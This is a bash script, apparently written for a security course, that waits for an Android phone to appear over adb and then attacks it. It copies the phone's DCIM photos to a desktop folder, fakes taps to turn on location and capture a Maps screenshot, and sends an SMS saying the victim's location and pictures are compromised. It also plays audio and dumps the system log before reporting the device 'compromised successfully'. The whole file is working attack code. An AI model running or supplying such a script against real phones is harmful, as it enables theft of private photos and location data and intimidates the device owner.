SLEEP="sleep 3s"

while :
do
	LOOP_AGAIN=true
	while read line; do
		#echo line
		if [ "$line" != "" ] && [ `echo $line | awk '{print $2}'` == "device" ]
			then
				# if detected
				echo $line
				echo $LOOP_AGAIN
				sleep 4s			
				
				# flush log
				adb shell rm /sdcard/attacklog.txt
				adb shell logcat -c

				# copy contents of DCIM from phone to desktop/output
				adb pull /storage/sdcard0/DCIM/. /home/cs5231/Desktop/output/

				# enable location services and locate
				adb shell input tap 0 0
				$SLEEP
				adb shell am start -a android.settings.LOCATION_SOURCE_SETTINGS
				$SLEEP
				adb shell input tap 400 300
				$SLEEP
				adb shell am start -n com.google.android.apps.maps/com.google.android.maps.MapsActivity
				$SLEEP
				adb shell input tap 445 760
				$SLEEP		
				# take screenshot
				adb shell screencap -p /sdcard/screen.png
				$SLEEP
				adb pull /sdcard/screen.png /home/cs5231/Desktop/
				adb shell rm /sdcard/screen.png
 
				# sms
				adb shell am start -a android.intent.action.SENDTO -d sms:101010101010 --es sms_body "Your location and pictures have been compromised" 
				$SLEEP
				# play music				
				adb shell am start -a android.intent.action.VIEW -d file:///storage/sdcard0/Music/play.mp3 -t audio/mp3
				$SLEEP
				# dump and pull log
				adb shell logcat -v raw -f /sdcard/attacklog.txt -d
				adb pull /sdcard/attacklog.txt /home/cs5231/Desktop/attacklog.txt

				# set flag to false
				LOOP_AGAIN=false
		fi
	done < <(adb devices)
	echo $LOOP_AGAIN
	if [ $LOOP_AGAIN == false ]
		then
			echo "Device compromised successfully"
			break
	fi
done
